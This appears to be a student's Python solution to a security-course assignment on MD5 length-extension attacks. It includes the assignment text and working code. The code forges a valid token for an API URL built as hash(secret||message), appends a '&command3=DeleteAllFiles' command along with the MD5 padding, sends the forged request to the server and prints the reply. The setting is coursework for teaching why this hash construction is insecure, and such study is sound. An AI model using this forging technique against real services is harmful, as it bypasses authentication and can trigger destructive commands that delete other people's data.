'''
construct hashes using hash( secret || message )

http://eecs388.org/project1/api?token=b301afea7dd96db3066e631741446ca1&user=admin&command1=ListFiles&command2=NoOp

Using the techniques that you learned in the previous section and 
without guessing the password, apply length extension to create a 
URL ending with &command3=DeleteAllFiles

Use quote() from urllib to encode non-ASCII characters in the URL


What to Submit: len_ext_attack.py

1. Accepts a valid URL in the same form as the one above as 
a command line argument.

2. Modifies the URL so that it will execute the DeleteAllFiles
command as the user.

3. Successfully performs the command on the server and prints
the server's response.


Assumptions:

1. The input URL will have the smae form as the sample above,
but we may change the server hostname and the values of
token, user, command1 and command2. These values may be of 
substantially different lengths thatn in the sample.

2. The input URL may be for a user with a different password,
but the length of the password will be unchanged.

3. The server's output might not exactly match what you see 
during testing

'''

# Your code to modify url goes here

# import appropriate library
import httplib, urlparse, sys, urllib
# url will be parsed in as the first argument
url = sys.argv[1]

# import md5 class and padding functions
from pymd5 import md5, padding

# split the url into hostname and rest of the arguements
# 'http://eecs388.org/project1/api'
hostname = url.split('?')[0]
# print hostname

# # ['token=b301afea7dd96db3066e631741446ca1', '&user=admin&command1=ListFiles&command2=NoOp']
arguments = url.split('?')[1].split('&', 1)
# print arguments

# splits hashed value from 'token=b301afea7dd96db3066e631741446ca1'
token = arguments[0].split('=')[1]

# since the user uses 8-character password 
# add 8 to the length of the url query
len_of_m = 8 + len(arguments[1])
bits = (len_of_m + len(padding(len_of_m*8)))*8

h = md5( state=token.decode("hex"), count=bits )
# suffix is the new command that's going to be appended in the original url query
suffix = '&command3=DeleteAllFiles'
h.update(suffix);
new_token = h.hexdigest()

new_url = hostname + '?token=' + new_token + '&' + arguments[1] + urllib.quote(padding(len_of_m*8)) + suffix
# print new_url

# the new url = 
# http://eecs388.org/project1/api?token=d127a022396f60239b3d08ecc0c4e3f4
# &user=admin&command1=ListFiles&command2=NoOp%80%00%00%00%00%98%01%00%00%00%00%00%00&command3=DeleteAllFiles

# parse url 
parsedUrl = urlparse.urlparse(new_url)

# establish connection to remote server
conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)

# prints result
print conn.getresponse().read()








